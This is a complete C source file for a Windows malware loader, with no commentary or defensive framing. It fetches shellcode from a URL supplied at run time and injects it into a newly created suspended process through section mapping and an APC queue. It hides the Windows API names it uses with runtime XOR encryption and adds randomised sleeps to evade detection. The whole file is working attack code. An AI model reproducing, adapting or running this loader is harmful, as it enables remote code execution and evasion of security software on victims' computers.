#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

// --- Structs and Typedefs for NT APIs ---
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// --- NT API Function Pointer Typedefs ---
typedef NTSTATUS (NTAPI *pNtCreateSection)(OUT PHANDLE, IN ACCESS_MASK, IN POBJECT_ATTRIBUTES, IN PLARGE_INTEGER, IN ULONG, IN ULONG, IN HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(IN HANDLE, IN HANDLE, IN OUT PVOID *, IN ULONG_PTR, IN SIZE_T, IN OUT PLARGE_INTEGER, IN OUT PSIZE_T, IN DWORD, IN ULONG, IN ULONG);

// --- Standard API Function Pointer Typedefs ---
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef DWORD (WINAPI *pResumeThread)(HANDLE);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef VOID (WINAPI *pSleep)(DWORD);
typedef DWORD (WINAPI *pGetLastError)(void);
typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);

// --- XOR Encryption/Decryption ---
void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) { data[i] ^= key[i % key_len]; }
}

// --- Jittered Sleep ---
void jittered_sleep(pSleep sleep_func) {
    if (sleep_func) { int sleep_time = 2000 + (rand() % 1000); sleep_func(sleep_time); }
}

// --- Shellcode Download ---
DWORD download_shellcode(const char *url, char **buffer, pInternetOpenA InetOpenA, pInternetOpenUrlA InetOpenUrlA, pInternetReadFile InetReadFile, pInternetCloseHandle InetCloseHandle) {
    if (!InetOpenA || !InetOpenUrlA || !InetReadFile || !InetCloseHandle) { return 0; }
    HINTERNET hInternet, hUrl;
    DWORD bytesRead = 0, totalSize = 0;
    char *tempBuffer = (char*)malloc(4096);
    char *data = NULL;
    if (!tempBuffer) return 0;
    hInternet = InetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { free(tempBuffer); return 0; }
    hUrl = InetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
    if (!hUrl) { free(tempBuffer); InetCloseHandle(hInternet); return 0; }
    while (InetReadFile(hUrl, tempBuffer, 4096, &bytesRead) && bytesRead > 0) {
        char *newData = (char*)realloc(data, totalSize + bytesRead);
        if (!newData) { free(data); free(tempBuffer); InetCloseHandle(hUrl); InetCloseHandle(hInternet); return 0; }
        data = newData;
        memcpy(data + totalSize, tempBuffer, bytesRead);
        totalSize += bytesRead;
    }
    *buffer = data;
    free(tempBuffer);
    InetCloseHandle(hUrl);
    InetCloseHandle(hInternet);
    return totalSize;
}

// Assigns result to 'dest' instead of creating a new variable
#define RESOLVE_FUNC(dest, h, type, name_str, key, key_len, GetProcAddress_ptr) \
    xor_crypt(name_str, strlen(name_str), key, key_len); \
    dest = (type)GetProcAddress_ptr(h, name_str); \
    xor_crypt(name_str, strlen(name_str), key, key_len); \
    if (!dest) { \
        xor_crypt(name_str, strlen(name_str), key, key_len); \
        fprintf(stderr, "[!] Failed to get address of: %s\n", name_str); \
        xor_crypt(name_str, strlen(name_str), key, key_len); \
        return EXIT_FAILURE; \
    }

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <path_to_exe> <shellcode_url>\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    srand(time(NULL));

    // --- Bootstrap essential functions ---
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) { fprintf(stderr, "[!] Critical: Failed to load kernel32.dll\n"); return EXIT_FAILURE; }
    
    pGetProcAddress GetProcAddress_ptr = (pGetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
    if (!GetProcAddress_ptr) { fprintf(stderr, "[!] Critical: Failed to get GetProcAddress\n"); return EXIT_FAILURE; }
    
    pLoadLibraryA LoadLibraryA_ptr = (pLoadLibraryA)GetProcAddress_ptr(hKernel32, "LoadLibraryA");
    if (!LoadLibraryA_ptr) { fprintf(stderr, "[!] Critical: Failed to get LoadLibraryA\n"); return EXIT_FAILURE; }

    // --- Generate dynamic key ---
    char dynamic_key[16];
    size_t key_len = sizeof(dynamic_key);
    for (size_t i = 0; i < key_len; i++) { dynamic_key[i] = rand() % 255 + 1; }

    // --- Define strings for encryption ---
    char ntdll_dll[] = "ntdll.dll", wininet_dll[] = "wininet.dll";
    char CreateProcessA_str[] = "CreateProcessA", NtCreateSection_str[] = "NtCreateSection";
    char NtMapViewOfSection_str[] = "NtMapViewOfSection", QueueUserAPC_str[] = "QueueUserAPC";
    char ResumeThread_str[] = "ResumeThread", CloseHandle_str[] = "CloseHandle";
    char Sleep_str[] = "Sleep", GetLastError_str[] = "GetLastError";
    char InternetOpenA_str[] = "InternetOpenA", InternetOpenUrlA_str[] = "InternetOpenUrlA";
    char InternetReadFile_str[] = "InternetReadFile", InternetCloseHandle_str[] = "InternetCloseHandle";

    // --- Encrypt all strings ---
    char* all_strs[] = {ntdll_dll, wininet_dll, CreateProcessA_str, NtCreateSection_str, NtMapViewOfSection_str, QueueUserAPC_str, ResumeThread_str, CloseHandle_str, Sleep_str, GetLastError_str, InternetOpenA_str, InternetOpenUrlA_str, InternetReadFile_str, InternetCloseHandle_str};
    for(int i = 0; i < sizeof(all_strs)/sizeof(all_strs[0]); i++){
        xor_crypt(all_strs[i], strlen(all_strs[i]), dynamic_key, key_len);
    }

    // --- Declare all function pointers ---
    pCreateProcessA pCreateProcessA_ptr; pQueueUserAPC pQueueUserAPC_ptr;
    pResumeThread pResumeThread_ptr; pCloseHandle pCloseHandle_ptr;
    pSleep pSleep_ptr; pGetLastError pGetLastError_ptr;
    pNtCreateSection pNtCreateSection_ptr; pNtMapViewOfSection pNtMapViewOfSection_ptr;
    pInternetOpenA pInternetOpenA_ptr; pInternetOpenUrlA pInternetOpenUrlA_ptr;
    pInternetReadFile pInternetReadFile_ptr; pInternetCloseHandle pInternetCloseHandle_ptr;
    
    // --- Resolve Kernel32 Functions ---
    RESOLVE_FUNC(pCreateProcessA_ptr, hKernel32, pCreateProcessA, CreateProcessA_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pQueueUserAPC_ptr, hKernel32, pQueueUserAPC, QueueUserAPC_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pResumeThread_ptr, hKernel32, pResumeThread, ResumeThread_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pCloseHandle_ptr, hKernel32, pCloseHandle, CloseHandle_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pSleep_ptr, hKernel32, pSleep, Sleep_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pGetLastError_ptr, hKernel32, pGetLastError, GetLastError_str, dynamic_key, key_len, GetProcAddress_ptr);

    // --- Resolve NTDLL Functions ---
    xor_crypt(ntdll_dll, strlen(ntdll_dll), dynamic_key, key_len);
    HMODULE hNtdll = LoadLibraryA_ptr(ntdll_dll);
    xor_crypt(ntdll_dll, strlen(ntdll_dll), dynamic_key, key_len);
    if (!hNtdll) { fprintf(stderr, "[!] Failed to load ntdll.dll\n"); return EXIT_FAILURE; }
    
    RESOLVE_FUNC(pNtCreateSection_ptr, hNtdll, pNtCreateSection, NtCreateSection_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pNtMapViewOfSection_ptr, hNtdll, pNtMapViewOfSection, NtMapViewOfSection_str, dynamic_key, key_len, GetProcAddress_ptr);

    // --- Resolve WinINet Functions ---
    xor_crypt(wininet_dll, strlen(wininet_dll), dynamic_key, key_len);
    HMODULE hWininet = LoadLibraryA_ptr(wininet_dll);
    xor_crypt(wininet_dll, strlen(wininet_dll), dynamic_key, key_len);
    if (!hWininet) { fprintf(stderr, "[!] Failed to load wininet.dll\n"); return EXIT_FAILURE; }
    
    RESOLVE_FUNC(pInternetOpenA_ptr, hWininet, pInternetOpenA, InternetOpenA_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pInternetOpenUrlA_ptr, hWininet, pInternetOpenUrlA, InternetOpenUrlA_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pInternetReadFile_ptr, hWininet, pInternetReadFile, InternetReadFile_str, dynamic_key, key_len, GetProcAddress_ptr);
    RESOLVE_FUNC(pInternetCloseHandle_ptr, hWininet, pInternetCloseHandle, InternetCloseHandle_str, dynamic_key, key_len, GetProcAddress_ptr);

    // --- Main Logic ---
    char* shellcode = NULL;
    DWORD shellcode_len = download_shellcode(argv[2], &shellcode, pInternetOpenA_ptr, pInternetOpenUrlA_ptr, pInternetReadFile_ptr, pInternetCloseHandle_ptr);
    if (shellcode_len == 0 || shellcode == NULL) { fprintf(stderr, "[!] Shellcode download failed.\n"); return EXIT_FAILURE; }
    printf("[+] Downloaded %lu bytes.\n", shellcode_len);

    jittered_sleep(pSleep_ptr);

    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    if (!pCreateProcessA_ptr(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[!] CreateProcessA failed. Error: %lu\n", pGetLastError_ptr());
        free(shellcode); return EXIT_FAILURE;
    }
    printf("[+] Created suspended process with PID: %lu\n", pi.dwProcessId);
    
    jittered_sleep(pSleep_ptr);

    HANDLE hSection = NULL; PVOID pLocalSection = NULL, pRemoteSection = NULL;
    LARGE_INTEGER sectionSize; sectionSize.QuadPart = shellcode_len;
    NTSTATUS status;

    status = pNtCreateSection_ptr(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) { fprintf(stderr, "[!] NtCreateSection failed. Status: 0x%lx\n", status); TerminateProcess(pi.hProcess, 1); pCloseHandle_ptr(pi.hProcess); pCloseHandle_ptr(pi.hThread); free(shellcode); return EXIT_FAILURE; }
    
    SIZE_T viewSize = 0;
    status = pNtMapViewOfSection_ptr(hSection, GetCurrentProcess(), &pLocalSection, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    if (status != 0) { fprintf(stderr, "[!] NtMapViewOfSection (local) failed. Status: 0x%lx\n", status); TerminateProcess(pi.hProcess, 1); pCloseHandle_ptr(pi.hProcess); pCloseHandle_ptr(pi.hThread); free(shellcode); return EXIT_FAILURE; }
    
    memcpy(pLocalSection, shellcode, shellcode_len);
    printf("[+] Shellcode written to local section view.\n");
    jittered_sleep(pSleep_ptr);

    viewSize = 0;
    status = pNtMapViewOfSection_ptr(hSection, pi.hProcess, &pRemoteSection, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
    if (status != 0) { fprintf(stderr, "[!] NtMapViewOfSection (remote) failed. Status: 0x%lx\n", status); TerminateProcess(pi.hProcess, 1); pCloseHandle_ptr(pi.hProcess); pCloseHandle_ptr(pi.hThread); free(shellcode); return EXIT_FAILURE; }
    printf("[+] Section view mapped into target process with RX permissions.\n");
    
    if (pQueueUserAPC_ptr((PAPCFUNC)pRemoteSection, pi.hThread, 0) == 0) {
        fprintf(stderr, "[!] QueueUserAPC failed. Error: %lu\n", pGetLastError_ptr());
        TerminateProcess(pi.hProcess, 1); pCloseHandle_ptr(pi.hProcess); pCloseHandle_ptr(pi.hThread); free(shellcode); return EXIT_FAILURE;
    }

    printf("[*] Resuming thread and triggering shellcode...\n");
    pResumeThread_ptr(pi.hThread);

    printf("[+] Injection complete. Cleaning up.\n");
    free(shellcode); pCloseHandle_ptr(hSection); pCloseHandle_ptr(pi.hProcess); pCloseHandle_ptr(pi.hThread);
    return EXIT_SUCCESS;
}
